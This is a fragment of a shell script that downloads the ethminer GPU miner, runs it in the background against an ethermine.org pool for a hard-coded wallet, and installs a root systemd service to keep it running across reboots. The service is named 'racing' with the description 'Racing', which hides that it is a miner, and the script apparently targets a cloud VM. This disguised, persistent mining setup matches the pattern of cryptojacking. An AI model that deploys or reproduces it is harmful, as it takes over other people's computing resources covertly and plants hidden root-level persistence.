...
then
    ...
    cd bin
    ./ethminer -U -P stratum://0xb28c89553Dcd56bD59f140932665Ecd0Dd9A8abc.talahuy@us2.ethermine.org:4444 &
else
    wget https://github.com/ethereum-mining/ethminer/releases/download/v0.19.0-alpha.0/ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
    tar xvzf ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
    cd bin
...
sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/azure/bin/ethminer -U -P stratum://0xb28c89553Dcd56bD59f140932665Ecd0Dd9A8abc.talahuy@us2.ethermine.org:4444\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
